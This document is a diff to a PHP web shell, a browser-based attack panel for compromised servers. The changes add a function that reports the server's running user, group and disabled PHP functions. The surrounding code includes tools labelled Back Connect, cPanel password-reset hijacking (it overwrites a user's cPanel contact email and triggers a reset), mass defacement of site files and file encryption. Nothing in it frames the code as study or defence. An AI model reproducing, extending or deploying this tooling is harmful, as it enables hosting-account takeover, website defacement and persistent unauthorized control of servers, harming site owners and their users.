@@ -174,8 +174,6 @@ text-shadow:0px 0px 12px #fff;
   background-color: #3f51b5;
   color:white;
 }
-
-
 .table_main{
 border: 2px solid #15d6c8;
 }
@@ -213,7 +211,6 @@ span{
 pre{
     margin:0;
     float:center;
-    margin-right:100px;
     color:white;
     font-weight:bold;
 }
@@ -221,9 +218,8 @@ pre{
 .menu {
     float:left;
     background:#000000;
-    width:100%;
+    width:100%; 
     padding:13px;
-    margin-bottom:10px;
 }
 .upload{
     float:left;
@@ -258,6 +254,23 @@ pre{
 <nav>
 ';
 
+/* USER / GROUP */
+function usergroup() {
+    if(!function_exists('posix_getegid')) {
+        $user['name']     = @get_current_user();
+        $user['uid']      = @getmyuid();
+        $user['gid']      = @getmygid();
+        $user['group']    = "?";
+    } else {
+        $user['uid']     = @posix_getpwuid(posix_geteuid());
+        $user['gid']     = @posix_getgrgid(posix_getegid());
+        $user['name']     = $user['uid']['name'];
+        $user['uid']     = $user['uid']['uid'];
+        $user['group']     = $user['gid']['name'];
+        $user['gid']     = $user['gid']['gid'];
+    }
+    return (object) $user;
+}
 $format = '
 <div class="info">
 <img class="logo" border="0" src="https://avatars.githubusercontent.com/u/54252313?s=400&u=05b0d718a52efbf60d0b7a3f7b816bf1a86dc28b&v=4" width="100" height="100">
@@ -265,19 +278,24 @@ $format = '
 <span>Server IP:&nbsp;</span> <font style="float:left;">%s </font><br>
 <span color="red"> Client IP:&nbsp;</span> <font style="float:left;">%s</font><br>
 <span color="red"> Date:&nbsp;</span> <font style="float:left;">%s</font><br>
-<span>PHP Version: &nbsp;</span><font style="float:left;"> %s</font>
+<span>PHP Version: &nbsp;</span><font style="float:left;"> %s</font><br>
+<span>Disabled_Function: &nbsp;</span><font style="float:left;"> %s</font><br>
+<span>User / Group: &nbsp;</span><font style="float:left;"> %s</font>
 <br>';
+
 
 $uname = php_uname();
 $server = $_SERVER['SERVER_ADDR']; 
 $client = $_SERVER['REMOTE_ADDR'];
 $date = date("Y/m/d");
 $phpversion = phpversion();
+$disabledfunc = @ini_get('disable_functions');
+$userg = usergroup()->name."(".usergroup()->uid.") / ".usergroup()->group."(".usergroup()->gid.")"; 
 
-echo sprintf($format,$uname,$server,$client,$date,$phpversion);
+echo sprintf($format,$uname,$server,$client,$date,$phpversion,$disabledfunc,$userg);
 
 
-echo '<div class="path"><font color="white">Cwd :</font> ';
+echo '<div class="path"><font color="white">Cwd :</font>';
 if(isset($_GET['path'])){
 $path = $_GET['path'];
 }else{
@@ -301,7 +319,7 @@ if($i != $id) echo "/";
 echo '">'.$pat.'</a>/';
 }
 
-echo '</div>';
+echo '</div><br>';
 
 
 /* Upload File */
@@ -336,14 +354,12 @@ echo "
 <a href='?tool=backconnect' class='w3-button w3-indigo w3-small w3-round'>Back Connect</a>
 <a href='?tool=about' class='w3-button w3-indigo w3-small w3-round'>About</a>
 <a href='?logout' class='w3-button w3-indigo w3-small w3-round'>Log Out</a>
-</div></nav><br>";
-  
+</div></nav>";
+
   
 function encrypt($def,$locdir){
-  
 # -----------Encrypt---------- #
            
-    
       if(isset($_POST['encrypt'])){
       if(!empty($def)){ 
        $fileList = glob("$locdir/*.*");
@@ -378,9 +394,8 @@ ErrorDocument 404 /indx.php");
 /* IF/ELSE MENU */
   
 if($_GET['tool'] == "crackcpanel"){
-   echo "<form method='POST'>";
-   echo "<font>ENTER EMAIL (cpanel reset password)</font><br><br>";
-   echo "<input style='background:white;color:lime;border:2px solid white;outline:none;width:230px;padding:6px;' type='email' name='cemail' placeholder='email'><br><br>";
+   echo "<form method='POST'>";echo "<font>ENTER EMAIL (cpanel reset password)</font><br><br>";
+   echo "<input style='background:white;color:black;border:2px solid white;outline:none;width:230px;padding:6px;' type='email' name='cemail' placeholder='email'><br><br>";
    echo "<input type='submit' value='crack' name='crackcpnel'>";
    echo "</form>";
    
@@ -396,8 +411,7 @@ if($_GET['tool'] == "crackcpanel"){
        $f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
        fwrite($f, $wr); 
        fclose($f);
-       /* CREATE FILE IN HOME */
-       $f = fopen('/home/'.$user.'/.contactinfo', 'w');
+       /* CREATE FILE IN HOME */$f = fopen('/home/'.$user.'/.contactinfo', 'w');
        fwrite($f, $wr); 
        fclose($f);
        $parm = 'http://'.$site.':2082/resetpass?start=1';
@@ -482,25 +496,10 @@ if($_GET['tool'] == "crackcpanel"){
 }
 
 else if($_GET['tool'] == "massdef"){
-    echo "<br><br>
-<pre style='font-weight:bold;color:lime;'>
-                                  
-                                  
-                      )__(        
-                      (66)        
-                     _/\/    )__( 
-               *    /   \    (oo) 
-                \_ / <^-.\----\/  
-                  ((_ )| \"   ||  
-                   > >`||----||   
-                   \ \ vv    vv   
-                    ` `           
-                     Mass Deface  
-                                  
-</pre>
-    ";
+    
     $path = $_GET['path'];
     echo '<form method="POST">
+    <br>
     <font>Directory</font><br>
     <input name="base_dir" style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" type="text" value="'.$path.'"><br><br>
     <font>File Name</font><br>
@@ -651,9 +650,7 @@ if(unlink($_POST['path'])){
 }
 echo '</center>';
 $scandir = scandir($path);
-echo '<div id="content">
-
-<table class="table_main" width="100%" border="0" cellpadding="8" cellspacing="1" align="center">
+echo '<div id="content"><table class="table_main" width="100%" border="0" cellpadding="8" cellspacing="1" align="center">
 <tr class="first">
 <td>Name</SCA></td>
 <td><center>Size</SCA></center></td>
